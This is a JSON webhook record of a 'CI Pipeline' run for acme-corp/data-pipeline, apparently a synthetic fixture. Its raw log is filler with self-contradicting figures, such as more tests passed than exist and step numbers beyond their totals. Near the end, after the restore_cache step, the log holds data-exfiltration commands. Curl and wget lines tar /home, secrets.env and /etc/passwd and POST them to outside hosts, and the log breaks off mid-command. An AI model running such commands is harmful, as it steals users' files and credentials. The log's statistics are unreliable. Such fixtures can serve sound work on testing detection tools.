{
  "action": "completed",
  "workflow_run": {
    "id": 244,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-295",
    "head_sha": "c1badee15205073f98cd6a6c45c71452872c353b",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-11T12:18:18.061302Z",
    "updated_at": "2025-12-11T12:20:39.266929Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:18] INFO: Request completed\nBundling runtime.js\npip: Installing build dependencies...\nUploading artifact 'build' (32 files)\nStep 15/25: Testing\nStep 1/20: Linting\nCompiling utils/main.py...\n\u2713 All checks passed\n[12:18:18] INFO: Request completed\nTransforming 406 files...\nFinished.\n\u2717 build failed with exit code 30\nStep 16/21: Testing\nLoading...\nCreating production build...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUploading artifact 'dist' (25 files)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling utils/main.py...\nOptimizing 91 modules...\nCompiling utils/service.java...\n[12:18:18] WARN: Deprecated API usage\nAlready up to date.\nnpm install: added 307 packages\nTest Suites: 28 passed, 31 total\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:18] INFO: Connecting to database\nGenerating source maps...\npip: Downloading jest-2.12.tar.gz\nBundling main.js\nStep 20/17: Testing\nTransforming 800 files...\nStep 11/24: Building\n[12:18:18] INFO: Connecting to database\nException: ValueError\nFinished.\nCache hit for key-3851\nPOST /api - 202 (489ms)\nUsing Node.js 14.15.4\nCreating production build...\nReady.\nArtifact uploaded: dist.zip (34MB)\nStep 3/15: Installing dependencies\nWARNING: webpack has known vulnerabilities\nCache miss for key-5611\nLoading...\n[12:18:18] WARN: Deprecated API usage\nStep 20/17: Linting\nWARNING: lodash has known vulnerabilities\nAlready up to date.\nArtifact uploaded: dist.zip (11MB)\nArtifact downloaded: 22MB\nMinifying main.js\nMinifying app.js\nWARNING: eslint has known vulnerabilities\n  PASS: test_user_create (24ms)\nArtifact uploaded: build.tar.gz (37MB)\n[12:18:18] WARN: Deprecated API usage\nAlready up to date.\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nHEAD is now at 39563df\n[12:18:18] INFO: Cache refreshed\nCompiling utils/main.py...\n\u2713 package completed\nCompiling src/handler.rs...\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nChecking out develop branch\nBuilding Docker image...\npip: Downloading eslint-1.18.tar.gz\nyarn add: Done in 14.14s\npip install: Successfully installed eslint-1.11\n\u2713 build completed\nException: RuntimeError\nFAILED: test_db_connect\nDone.\nCreating production build...\nGET /api - 200 (3ms)\npip: Downloading express-4.17.tar.gz\nArtifact downloaded: 10MB\nCompiling components/utils.go...\nDone.\npip: Collecting prettier\nDone.\nLoading...\n[12:18:18] WARN: Deprecated API usage\nyarn add: Done in 8.22s\nCompleted.\nSnapshots: 19 passed, 25 total\nyarn add: Done in 2.89s\nTests: 439 passed, 83 total\nRan 46 tests in 60s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 9 passed, 50 total\nArtifact downloaded: 48MB\n[12:18:18] DEBUG: Connection pool: 13 active\nVerifying...\nCache hit for key-8248\nFetching submodules...\nLayer 7/11: RUN command\nRan 24 tests in 30s\nCompiling lib/index.js...\nFinished.\nnpm notice: package.json updated\nArtifact downloaded: 29MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:18] INFO: Connecting to database\nCompiling lib/app.ts...\nRan 61 tests in 24s\nCache restored successfully (114MB)\nTime: 13.756s\nBuilding Docker image...\n[12:18:18] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nSnapshots: 39 passed, 40 total\n\u2713 Task completed in 1523ms\nConnecting to startup.dev:443...\nCompiling lib/utils.go...\n[12:18:18] INFO: Connecting to database\nCache saved successfully\nFAILED: test_user_create\n[12:18:18] DEBUG: Loading configuration\nCache saved successfully\n\u2713 test completed\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 187 tests in 6s\nLayer 6/13: ENV command\n\u2713 lint completed\nCoverage: 95% statements, 63% branches\n[12:18:18] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/15: Building\nEnvironment: staging\nCache restored successfully (272MB)\n[12:18:18] INFO: Starting build process\nChecking out develop branch\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\n[12:18:18] DEBUG: Query executed in 76ms\n[12:18:18] INFO: Cache refreshed\n[12:18:18] DEBUG: Initializing service\nnpm install: added 63 packages\n[12:18:18] WARN: Deprecated API usage\npip: Collecting react\nCompiling components/index.js...\npip install: Successfully installed lodash-3.5\n[12:18:18] DEBUG: Query executed in 74ms\nBundling runtime.js\nOK\nImage pulled successfully\npip: Downloading webpack-3.4.tar.gz\nWaiting...\n[12:18:18] INFO: Processing request\npip: Downloading axios-2.4.tar.gz\n[12:18:18] DEBUG: Connection pool: 10 active\nUploading artifact 'build' (7 files)\n  PASS: integration/test_auth_login.spec.js\nEnvironment: staging\n  PASS: e2e/test_api_health.spec.js\nArtifact uploaded: dist.zip (41MB)\nRan 89 tests in 19s\nCompiling src/app.ts...\nTransforming 257 files...\nGET /health - 201 (76ms)\nSnapshots: 8 passed, 50 total\nArtifact downloaded: 18MB\n[12:18:18] DEBUG: Query executed in 33ms\n[12:18:18] INFO: Cache refreshed\nOK\nBundling styles.js\n\u2713 All checks passed\n\u2717 build failed with exit code 40\nOptimizing 20 modules...\n\u2713 Step 'setup' succeeded\nChecking out main branch\nnpm install: resolved 125 packages\nWaiting...\nHEAD is now at 245cdbd\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: webpack has known vulnerabilities\nCompiling components/app.ts...\nChecking out master branch\nCoverage: 71% statements, 94% branches\nAlready up to date.\nConnection established\npip install: Successfully installed axios-4.16\nCache restored successfully (477MB)\nCompleted.\n  PASS: test_auth_login (312ms)\nCoverage: 71% statements, 77% branches\nOK\nHEAD is now at 4de5c45\n\u2713 build completed\nnpm install: resolved 1928 packages\nUploading artifact 'coverage' (49 files)\nSwitched to branch 'feature/task-870'\n[12:18:18] INFO: Processing request\nSwitched to branch 'hotfix/task-908'\nUsing Node.js 20.11.6\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 1442 packages\nCache invalidated: build\nGET /health - 201 (56ms)\nConnection established\nImage pulled successfully\nTests: 295 passed, 55 total\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\n\u2713 Step 'build' succeeded\n[12:18:18] INFO: Starting build process\nUsing Python 3.9\nDone.\nUsing Python 3.10\n[12:18:18] INFO: Starting build process\n[12:18:18] ERROR: Connection failed\nCache restored successfully (149MB)\nArtifact uploaded: build.tar.gz (46MB)\nWARNING: express has known vulnerabilities\n[12:18:18] DEBUG: Loading configuration\nGenerating source maps...\nDone.\nUsing Python 3.10\nGET /health - 201 (22ms)\nConnecting to startup.dev:443...\nnpm install: resolved 1961 packages\n\u2713 Task completed in 2517ms\nVerifying...\npip: Downloading express-3.2.tar.gz\nnpm notice: package.json updated\n[12:18:18] INFO: Cache refreshed\nCreating production build...\n\u2713 All checks passed\nUsing Python 3.11\n[12:18:18] ERROR: Connection failed\nWaiting...\n[12:18:18] INFO: Cache refreshed\n[12:18:18] DEBUG: Memory usage: 1491MB\nStep 14/22: Deploying\nCache invalidated: build\n[12:18:18] INFO: Processing request\n[12:18:18] DEBUG: Memory usage: 699MB\nnpm install: added 292 packages\nCompiling components/main.py...\nCompiling lib/app.ts...\nOK\nOK\nLoading...\n\u2717 build failed with exit code 67\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting webpack\nCache invalidated: node_modules\n\u2713 Step 'install' succeeded\nTests: 463 passed, 120 total\nCompiling components/index.js...\n[12:18:18] INFO: Request completed\nStep 9/15: Installing dependencies\nStep 4/25: Building\nWARNING: prettier has known vulnerabilities\nRan 75 tests in 19s\nFAILED: test_user_create\nnpm install: resolved 814 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading jest-5.5.tar.gz\nTime: 19.178s\nPlatform: win32-x64\nPOST /data - 201 (320ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (228MB)\nChecking out master branch\nPushing to registry...\npip: Downloading express-2.13.tar.gz\nnpm install: added 401 packages\nCompleted.\n[12:18:18] INFO: Request completed\nStep 17/18: Testing\n[12:18:18] DEBUG: Connection pool: 4 active\nCreating production build...\n\u2713 All checks passed\n=== Step unit_tests completed ===\n=== Step: checkout ===\nConnecting to cloud.services:443...\nConnecting to example.com:443...\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\nnpm notice: created a lockfile\nLoading...\nRan 156 tests in 53s\nCache miss for key-5431\nFAILED: test_auth_login\nnpm notice: created a lockfile\nImage pulled successfully\nWARNING: express has known vulnerabilities\n[12:18:18] INFO: Starting build process\nArtifact uploaded: dist.zip (70MB)\nCompiling src/service.java...\nProcessing...\nCache hit for key-7673\nCoverage: 96% statements, 80% branches\nCompiling utils/utils.go...\nStep 18/24: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSnapshots: 34 passed, 25 total\nReady.\n  PASS: e2e/test_auth_login.spec.js\nTests: 343 passed, 93 total\nCache restored successfully (362MB)\n\u2713 Task completed in 2874ms\nGenerating source maps...\nStep 16/25: Testing\nImage pulled successfully\nMinifying app.js\nAlready up to date.\nyarn add: Done in 27.14s\n[12:18:18] DEBUG: Query executed in 14ms\n[12:18:18] INFO: Starting build process\nImage pulled successfully\nReady.\nCreating production build...\nStep 11/24: Running migrations\nCompiling lib/index.js...\nTests: 66 passed, 493 total\nStep 13/17: Building\nOK\nHEAD is now at a044095\n[12:18:18] DEBUG: Query executed in 19ms\nStep 3/20: Installing dependencies\nOK\nLoading...\nArtifact downloaded: 39MB\nCompiling src/index.js...\n[12:18:18] INFO: Request completed\npip: Downloading jest-5.3.tar.gz\n\u2717 build failed with exit code 88\nSuccess!\n[12:18:18] WARN: Deprecated API usage\nCompiling src/service.java...\nCreating production build...\nBuilding Docker image...\nProcessing...\n[12:18:18] DEBUG: Query executed in 10ms\nStep 10/19: Running migrations\nSuccess!\n\u2713 Step 'build' succeeded\nWaiting...\npip install: Successfully installed webpack-2.1\nStep 3/21: Deploying\n  PASS: e2e/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nCompleted.\n=== Step checkout completed ===\n=== Step: build ===\nnpm notice: package.json updated\nOptimizing 16 modules...\nBundling main.js\nInstalling jest@2.20.9\n[12:18:18] INFO: Processing request\n[12:18:18] INFO: Request completed\nWARNING: express has known vulnerabilities\nFinished.\nCompiling src/main.py...\nCache hit for key-8304\n[12:18:18] INFO: Request completed\nConnecting to startup.dev:443...\nPushing to registry...\nPOST /api - 201 (161ms)\nStep 18/19: Running migrations\nUsing Python 3.10\nSnapshots: 48 passed, 29 total\nnpm notice: created a lockfile\nCoverage: 74% statements, 81% branches\nCompiling src/main.py...\nCompiling components/index.js...\nCompiling utils/utils.go...\nUsing Python 3.10\n\u2713 lint completed\n[12:18:18] DEBUG: Connection pool: 10 active\nWARNING: express has known vulnerabilities\nStep 9/21: Linting\n\u2713 Step 'install' succeeded\nCompleted.\n[12:18:18] INFO: Connecting to database\n[12:18:18] INFO: Connecting to database\nConnection established\nException: RuntimeError\nStep 14/23: Running migrations\nUploading artifact 'build' (15 files)\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-8942\nSuccess!\nCompiling utils/main.py...\nFetching submodules...\nWARNING: express has known vulnerabilities\nTest Suites: 47 passed, 7 total\nFetching submodules...\nCache restored successfully (68MB)\nCompiling utils/app.ts...\nProcessing...\n\u2713 Task completed in 3314ms\n[12:18:18] DEBUG: Connection pool: 1 active\nSnapshots: 42 passed, 20 total\nnpm install: added 106 packages\n[12:18:18] DEBUG: Memory usage: 890MB\nOK\n\u2713 lint completed\nOptimizing 59 modules...\nGET /status - 200 (54ms)\nArtifact uploaded: build.tar.gz (32MB)\nStep 1/22: Testing\n[12:18:18] DEBUG: Initializing service\nUsing Python 3.12\n  PASS: e2e/test_cache_hit.spec.js\nCoverage: 80% statements, 79% branches\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nNODE_ENV=production\nPulling image: alpine:18\n[12:18:18] INFO: Request completed\nVerifying...\nWARNING: react has known vulnerabilities\nArtifact uploaded: dist.zip (7MB)\n=== Step build completed ===\n=== Step: setup_node ===\nPushing to registry...\nStep 9/17: Installing dependencies\nStep 6/25: Running migrations\nCoverage: 89% statements, 96% branches\nTLS handshake completed\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 14MB\nConnection established\npip install: Successfully installed jest-5.19\nUploading artifact 'dist' (23 files)\nArtifact downloaded: 50MB\nFetching submodules...\n[12:18:18] INFO: Connecting to database\nFinished.\nRan 11 tests in 45s\npip install: Successfully installed jest-3.8\n[12:18:18] DEBUG: Initializing service\nStep 15/22: Running migrations\nAlready up to date.\nWARNING: react has known vulnerabilities\nCache saved successfully\nPlatform: win32-x64\nPushing to registry...\nTransforming 680 files...\n[12:18:18] INFO: Connecting to database\nException: TypeError\nArtifact uploaded: dist.zip (70MB)\n[12:18:18] DEBUG: Memory usage: 723MB\n[12:18:18] DEBUG: Connection pool: 10 active\nCoverage: 94% statements, 76% branches\nCache miss for key-3195\n[12:18:18] DEBUG: Query executed in 37ms\n[12:18:18] DEBUG: Query executed in 32ms\npip: Collecting lodash\nPOST /api - 202 (252ms)\nEnvironment: production\nConnection established\nCache invalidated: node_modules\nArtifact downloaded: 48MB\nStep 1/15: Testing\nCompiling components/handler.rs...\npip: Downloading jest-5.16.tar.gz\nWARNING: jest has known vulnerabilities\nAlready up to date.\nAlready up to date.\n[12:18:18] INFO: Starting build process\nCompiling utils/handler.rs...\nSnapshots: 8 passed, 5 total\nInstalling express@4.7.4\n[12:18:18] DEBUG: Connection pool: 18 active\n\u2713 validate completed\n[12:18:18] INFO: Connecting to database\n  PASS: e2e/test_auth_login.spec.js\nProcessing...\nBundling main.css\nNODE_ENV=test\nUploading artifact 'build' (50 files)\nArtifact uploaded: build.tar.gz (42MB)\nStep 15/23: Testing\nArtifact uploaded: dist.zip (79MB)\nOptimizing 80 modules...\nCompleted.\nRan 63 tests in 14s\nArtifact uploaded: build.tar.gz (47MB)\nVerifying...\nUploading artifact 'build' (47 files)\nUploading artifact 'coverage' (2 files)\nCompiling lib/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=test\n=== Step setup_node completed ===\n=== Step: type_check ===\nUsing Python 3.12\nWARNING: axios has known vulnerabilities\n  PASS: unit/test_api_health.spec.js\nDone.\n[12:18:18] DEBUG: Query executed in 77ms\nPOST /upload - 202 (373ms)\n[12:18:18] WARN: Deprecated API usage\n[12:18:18] DEBUG: Connection pool: 9 active\n\u2713 Task completed in 4851ms\nUsing Node.js 20.18.4\nStep 10/21: Deploying\n  PASS: test_api_health (298ms)\nWARNING: webpack has known vulnerabilities\nOK\nnpm notice: created a lockfile\n[12:18:18] INFO: Processing request\nBuilding Docker image...\nCache saved successfully\nVerifying...\nCompiling lib/app.ts...\nProcessing...\n  PASS: e2e/test_api_health.spec.js\nSwitched to branch 'bugfix/task-370'\nWARNING: react has known vulnerabilities\n[12:18:18] INFO: Connecting to database\nTest Suites: 44 passed, 40 total\n[12:18:18] WARN: Deprecated API usage\nnpm install: resolved 1270 packages\n\u2713 test completed\nBundling vendor.js\nTest Suites: 46 passed, 36 total\npip: Installing build dependencies...\nTests: 383 passed, 90 total\n[12:18:18] INFO: Request completed\nException: NullPointerException\n\u2713 Task completed in 4288ms\nEnvironment: test\n[12:18:18] INFO: Request completed\nNODE_ENV=production\nGenerating source maps...\nCreating production build...\nLayer 1/9: RUN command\nInstalling prettier@1.3.3\nArtifact uploaded: dist.zip (80MB)\npip: Installing build dependencies...\npip install: Successfully installed react-1.9\nCompiling components/app.ts...\nArtifact downloaded: 20MB\nArtifact uploaded: dist.zip (98MB)\nSuccess!\nCompiling components/utils.go...\nArtifact uploaded: dist.zip (60MB)\n\u2713 Task completed in 691ms\nStep 16/23: Running migrations\n  PASS: test_db_connect (191ms)\nConnecting to test.io:443...\nStep 8/25: Building\nWARNING: axios has known vulnerabilities\nWaiting...\nPulling image: node:3.11\nFetching submodules...\nTime: 37.142s\nStep 3/17: Linting\nPulling image: alpine:18\nUsing Node.js 14.15.0\nRan 154 tests in 21s\npip: Installing build dependencies...\nConnecting to startup.dev:443...\nStep 5/23: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step type_check completed ===\n=== Step: lint ===\nDone.\nTests: 287 passed, 483 total\n[12:18:18] DEBUG: Connection pool: 19 active\nnpm install: added 365 packages\nException: ValueError\nLoading...\nCache saved successfully\nStep 3/25: Installing dependencies\n[12:18:18] DEBUG: Query executed in 80ms\nDone.\nyarn add: Done in 13.13s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling prettier@4.10.3\nnpm notice: package.json updated\nCompiling src/service.java...\nSnapshots: 12 passed, 11 total\n[12:18:18] DEBUG: Initializing service\n[12:18:18] DEBUG: Initializing service\nArtifact uploaded: dist.zip (13MB)\nStep 4/25: Testing\nOK\nFetching submodules...\nStep 7/20: Deploying\nPlatform: darwin-arm64\nCompiling lib/app.ts...\nTests: 294 passed, 277 total\n\u2713 All checks passed\nStep 10/24: Running migrations\nCache restored successfully (390MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9076\nStep 4/20: Testing\nStep 8/18: Deploying\nWARNING: express has known vulnerabilities\nFetching submodules...\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (29MB)\nSnapshots: 13 passed, 37 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\n[12:18:18] INFO: Cache refreshed\nWaiting...\nOK\nnpm notice: package.json updated\npip install: Successfully installed lodash-2.4\nPlatform: linux-x64\n[12:18:18] INFO: Connecting to database\nGenerating source maps...\nConnecting to startup.dev:443...\nTests: 342 passed, 323 total\nPOST /data - 201 (374ms)\nBundling main.js\n  PASS: test_auth_login (4ms)\nCompiling utils/main.py...\n  PASS: test_auth_login (69ms)\nCompiling utils/main.py...\nArtifact downloaded: 14MB\nInstalling webpack@4.9.0\nnpm notice: package.json updated\n[12:18:18] INFO: Request completed\n[12:18:18] DEBUG: Memory usage: 1379MB\nMinifying app.js\n[12:18:18] INFO: Processing request\nnpm notice: package.json updated\nTransforming 675 files...\n[12:18:18] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:18] WARN: Deprecated API usage\nCache hit for key-9489\nCache restored successfully (433MB)\n=== Step lint completed ===\n=== Step: deploy_production ===\nUsing Node.js 15.8.7\nFetching submodules...\nUsing Node.js 17.1.3\nnpm notice: package.json updated\nArtifact downloaded: 20MB\nStep 2/20: Linting\nTLS handshake completed\nOptimizing 13 modules...\nStep 18/16: Running migrations\nTest Suites: 44 passed, 45 total\nTest Suites: 39 passed, 10 total\nSnapshots: 39 passed, 24 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying main.js\nWaiting...\npip: Downloading axios-5.9.tar.gz\n\u2717 build failed with exit code 43\nyarn add: Done in 8.89s\n[12:18:18] INFO: Processing request\n[12:18:18] INFO: Starting build process\nLoading...\nNODE_ENV=production\nCache saved successfully\n[12:18:18] DEBUG: Memory usage: 234MB\n[12:18:18] WARN: Deprecated API usage\nCompiling src/app.ts...\nStep 8/20: Deploying\nArtifact downloaded: 12MB\nDone.\nyarn add: Done in 26.94s\nCache saved successfully\nCache hit for key-4864\n[12:18:18] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\nPushing to registry...\n[12:18:18] DEBUG: Initializing service\n\u2713 Step 'install' succeeded\nOptimizing 27 modules...\npip: Installing build dependencies...\nEnvironment: development\n[12:18:18] WARN: Deprecated API usage\n\u2717 build failed with exit code 84\nConnecting to cloud.services:443...\npip: Installing build dependencies...\nTransforming 533 files...\nWARNING: eslint has known vulnerabilities\n[12:18:18] INFO: Connecting to database\nStep 3/21: Installing dependencies\nSuccess!\nBundling styles.js\n[12:18:18] INFO: Cache refreshed\nCompiling utils/main.py...\nWARNING: prettier has known vulnerabilities\nPushing to registry...\nOK\nGenerating source maps...\n\u2717 build failed with exit code 41\n[12:18:18] INFO: Processing request\nCache invalidated: dependencies\n[12:18:18] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:18] DEBUG: Memory usage: 290MB\nStep 8/19: Running migrations\n[12:18:18] INFO: Cache refreshed\npip: Downloading eslint-2.20.tar.gz\nCache hit for key-2697\nCompleted.\nStep 4/21: Linting\nCreating production build...\nProcessing...\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\n\u2717 build failed with exit code 38\n[12:18:18] DEBUG: Memory usage: 496MB\nFinished.\nGenerating source maps...\n[12:18:18] INFO: Processing request\nStep 5/20: Building\nNODE_ENV=production\nPOST /data - 200 (178ms)\nStep 16/19: Testing\nSwitched to branch 'bugfix/task-409'\nnpm notice: package.json updated\nCompleted.\nUsing Python 3.9\nVerifying...\nWARNING: eslint has known vulnerabilities\nyarn add: Done in 12.6s\nBundling styles.css\n[12:18:18] ERROR: Connection failed\nUploading artifact 'dist' (1 files)\nArtifact downloaded: 32MB\nRan 28 tests in 25s\n[12:18:18] INFO: Processing request\nArtifact uploaded: dist.zip (51MB)\nStep 7/25: Building\n[12:18:18] INFO: Request completed\n[12:18:18] INFO: Request completed\nBundling main.css\nStep 3/15: Building\nTests: 368 passed, 97 total\nSuccess!\n[12:18:18] INFO: Cache refreshed\nPOST /upload - 200 (25ms)\nChecking out develop branch\n[12:18:18] WARN: Deprecated API usage\nConnection established\n[12:18:18] DEBUG: Initializing service\nnpm install: added 87 packages\nMinifying app.js\nyarn add: Done in 2.17s\nyarn add: Done in 26.81s\nSwitched to branch 'hotfix/task-702'\n[12:18:18] INFO: Connecting to database\nHEAD is now at 96c908a\nSwitched to branch 'feature/task-222'\n\u2713 test completed\nStep 4/22: Running migrations\nBundling main.js\n  PASS: test_db_connect (460ms)\nPlatform: win32-x64\nProcessing...\nPlatform: darwin-arm64\nCache saved successfully\nPulling image: python:latest\nnpm install: added 471 packages\nLayer 5/13: COPY command\nCache saved successfully\nCache miss for key-9687\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 95% statements, 80% branches\n[12:18:18] DEBUG: Loading configuration\nStep 12/16: Installing dependencies\n[12:18:18] WARN: Deprecated API usage\nPushing to registry...\nFAILED: test_user_create\nAlready up to date.\n[12:18:18] DEBUG: Connection pool: 4 active\nCoverage: 87% statements, 83% branches\nnpm install: added 346 packages\nnpm notice: created a lockfile\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nCompiling utils/app.ts...\n[12:18:18] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-120'\nImage pulled successfully\n[12:18:18] INFO: Processing request\nCompiling lib/app.ts...\nReady.\n  PASS: test_auth_login (322ms)\nCompiling src/main.py...\n[12:18:18] INFO: Starting build process\npip: Installing build dependencies...\nnpm notice: package.json updated\nCache restored successfully (89MB)\nBundling main.js\nPushing to registry...\nnpm install: resolved 464 packages\nCompiling components/service.java...\nFinished.\n\u2717 build failed with exit code 80\nUsing Node.js 20.13.10\nLayer 8/8: RUN command\nArtifact uploaded: build.tar.gz (18MB)\nFinished.\nException: RuntimeError\nSnapshots: 28 passed, 48 total\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: e2e/test_db_connect.spec.js\nBundling vendor.js\nnpm notice: package.json updated\nTLS handshake completed\n[12:18:18] DEBUG: Connection pool: 16 active\n[12:18:18] DEBUG: Loading configuration\n[12:18:18] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (49MB)\nUsing Node.js 14.4.10\nFinished.\npip: Installing build dependencies...\n\u2713 Step 'checkout' succeeded\nTests: 306 passed, 275 total\n\u2717 build failed with exit code 24\nFAILED: test_api_health\nCompiling components/utils.go...\nEnvironment: development\n[12:18:18] INFO: Connecting to database\nPlatform: linux-x64\n[12:18:18] WARN: Deprecated API usage\nnpm install: resolved 1394 packages\npip install: Successfully installed jest-5.6\nPulling image: python:18\nRan 47 tests in 4s\nCompleted.\nSwitched to branch 'hotfix/task-941'\nRan 43 tests in 32s\npip: Downloading webpack-4.18.tar.gz\nTLS handshake completed\n[12:18:18] DEBUG: Connection pool: 13 active\nCreating production build...\nCreating production build...\nException: ValueError\n[12:18:18] INFO: Request completed\n  PASS: test_user_create (447ms)\nTLS handshake completed\nTest Suites: 14 passed, 49 total\nStep 5/17: Running migrations\n\u2713 Task completed in 2816ms\npip: Collecting webpack\nnpm notice: package.json updated\nChecking out main branch\nStep 9/16: Building\n\u2713 Task completed in 211ms\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nWARNING: jest has known vulnerabilities\nCache invalidated: dependencies\nInstalling eslint@1.4.8\nPOST /upload - 201 (141ms)\nStep 7/21: Linting\n[12:18:18] INFO: Cache refreshed\nTests: 278 passed, 164 total\nCreating production build...\n\u2713 Step 'setup' succeeded\nLoading...\nCache saved successfully\nyarn add: Done in 2.55s\nOK\n[12:18:18] DEBUG: Memory usage: 137MB\nFetching submodules...\n  PASS: test_db_connect (100ms)\nHEAD is now at b8f9ad9\nOptimizing 71 modules...\nCoverage: 82% statements, 98% branches\nRan 108 tests in 22s\nFinished.\nCoverage: 84% statements, 65% branches\nNODE_ENV=production\nPlatform: linux-x64\nCompiling lib/main.py...\nOptimizing 16 modules...\nSwitched to branch 'bugfix/task-303'\nBundling styles.css\nException: NullPointerException\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:18] INFO: Cache refreshed\nOptimizing 97 modules...\n\u2713 Step 'build' succeeded\nFAILED: test_auth_login\nStep 7/23: Building\n\u2717 build failed with exit code 53\nPulling image: python:latest\nCache hit for key-3060\nWaiting...\nTransforming 640 files...\nUsing Node.js 18.3.5\nConnection established\nyarn add: Done in 13.26s\nFetching submodules...\nStep 13/22: Deploying\nnpm notice: package.json updated\nAlready up to date.\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (309ms)\nUsing Python 3.9\nFinished.\nNODE_ENV=test\nStep 18/22: Deploying\nRan 153 tests in 33s\n[12:18:18] INFO: Connecting to database\n[12:18:18] DEBUG: Memory usage: 1082MB\nHEAD is now at 56079c7\nStep 15/23: Running migrations\n[12:18:18] INFO: Processing request\nCoverage: 78% statements, 99% branches\nRan 183 tests in 19s\nCompiling components/utils.go...\n[12:18:18] INFO: Processing request\npip install: Successfully installed react-2.4\nProcessing...\n[12:18:18] INFO: Connecting to database\nCompiling lib/index.js...\nTest Suites: 33 passed, 18 total\npip: Collecting react\n=== Step install_dependencies completed ===\n=== Step: restore_cache ===\nStep 9/20: Testing\nCache hit for key-6011\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (12MB)\nConnecting to cloud.services:443...\nWaiting...\n\u2713 Step 'setup' succeeded\nUsing Python 3.10\n\u2717 build failed with exit code 80\nTest Suites: 9 passed, 34 total\nTime: 17.686s\nProcessing...\n[12:18:18] INFO: Cache refreshed\nStep 15/25: Deploying\nCache restored successfully (475MB)\n  PASS: unit/test_auth_login.spec.js\nFetching submodules...\nCompiling lib/service.java...\nImage pulled successfully\nCompiling lib/handler.rs...\nArtifact uploaded: build.tar.gz (50MB)\n[12:18:18] DEBUG: Loading configuration\nTransforming 599 files...\nException: NullPointerException\nArtifact downloaded: 20MB\npip install: Successfully installed jest-3.4\nyarn add: Done in 26.74s\n  PASS: test_cache_hit (4ms)\nVerifying...\nWaiting...\n[12:18:18] INFO: Connecting to database\nLayer 7/13: ENV command\nProcessing...\nTransforming 886 files...\nnpm notice: package.json updated\n[12:18:18] INFO: Connecting to database\n\u2713 All checks passed\nCompiling lib/main.py...\nCompiling components/utils.go...\nSnapshots: 43 passed, 28 total\n\u2713 Task completed in 1849ms\nTime: 3.474s\nCache hit for key-5231\nHEAD is now at 3c635b2\nTLS handshake completed\n[12:18:18] ERROR: Connection failed\nException: NullPointerException\nImage pulled successfully\nWARNING: jest has known vulnerabilities\nConnecting to cloud.services:443...\nImage pulled successfully\nCache restored successfully (448MB)\nSuccess!\nyarn add: Done in 16.14s\nCompiling src/index.js...\nGenerating source maps...\nCompiling utils/handler.rs...\nImage pulled successfully\nCache invalidated: build\nDone.\nnpm notice: created a lockfile\nChecking out develop branch\n  PASS: test_db_connect (144ms)\nnpm notice: package.json updated\nConnecting to cloud.services:443...\n\u2713 validate completed\nCompiling lib/service.java...\nReady.\nConnection established\nSnapshots: 46 passed, 24 total\n=== Step restore_cache completed ===\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n=== Step: save_cache ===\n\u2717 build failed with exit code 126\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\npip: Collecting axios\nTLS handshake completed\nArtifact uploaded: build.tar.gz (25MB)\nProcessing...\ncurl -X POST https://cloud.services/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nEnvironment: test\n\u2717 build failed with exit code 108\nTime: 40.874s\nTests: 321 passed, 58 total\nTests: 329 passed, 242 total\nCompiling src/utils.go...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\npip: Installing build dependencies...\nTime: 94.285s\ncurl -X POST 